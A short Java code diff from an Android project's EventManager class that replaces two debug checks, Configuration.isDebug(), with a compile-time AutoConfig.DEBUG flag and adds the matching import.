@@ -16,6 +16,7 @@ import android.util.Log;
 import com.android.service.Manager;
 import com.android.service.agent.AgentBase;
 import com.android.service.agent.AgentType;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.util.Check;
 
@@ -107,7 +108,7 @@ public class EventManager extends Manager<EventBase, Integer, EventType> {
 
 				if (!e.isRunning()) {
 					final Thread t = new Thread(e);
-					if (Configuration.isDebug()) {
+					if (AutoConfig.DEBUG) {
 						t.setName(e.getClass().getSimpleName());
 					}
 					t.start();
@@ -146,7 +147,7 @@ public class EventManager extends Manager<EventBase, Integer, EventType> {
 					threads.remove(event);
 
 				} catch (final InterruptedException e) {
-					if(Configuration.isDebug()) { e.printStackTrace(); }
+					if(AutoConfig.DEBUG) { e.printStackTrace(); }
 					Log.d("QZ", TAG + " Error: " + e.toString());
 				}
 			} else {
